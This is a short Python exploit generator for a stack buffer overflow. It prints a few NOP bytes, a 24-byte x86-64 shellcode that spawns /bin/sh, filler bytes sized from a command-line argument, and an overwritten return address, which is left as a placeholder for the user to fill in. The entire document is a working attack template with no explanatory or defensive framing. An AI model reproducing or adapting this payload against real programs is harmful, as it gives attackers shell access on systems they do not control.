#!/bin/env python3

import struct
import sys

# Shellcode: 24 byte
shellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05'
sled = int(sys.argv[1]) - len(shellcode)
stack_address = 0x........ # Add target address here

target = struct.pack("<Q", stack_address)

sys.stdout.buffer.write(b'\x90'*5)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xAA'*(sled-5))
sys.stdout.buffer.write(target)
